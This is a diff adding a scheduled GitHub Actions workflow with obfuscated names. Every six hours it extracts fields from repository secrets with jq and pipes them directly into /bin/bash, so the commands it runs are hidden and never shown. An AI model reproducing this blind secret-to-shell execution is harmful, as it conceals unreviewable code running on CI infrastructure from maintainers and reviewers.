@@ -1,0 +1,25 @@
+name: zijichutianqiu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zijichutianqiu
+        env:
+          hjkrv6: ${{ secrets.hjkrv6 }}
+        run: |
+          echo $hjkrv6 | jq -r .vubxr885 | /bin/bash
+          echo $e388 | jq -r .p72 | /bin/bash
+          echo $zsm10212 | jq -r .qspy0 | /bin/bash
+          echo $fbn40 | jq -r .x89 | /bin/bash
+          echo $mqpal0457 | jq -r .yl094 | /bin/bash
+          echo $wpm14607 | jq -r .tsi0956 | /bin/bash
+          echo $bkqh30915 | jq -r .t5 | /bin/bash
+          echo $doo17161 | jq -r .xfl8 | /bin/bash
+
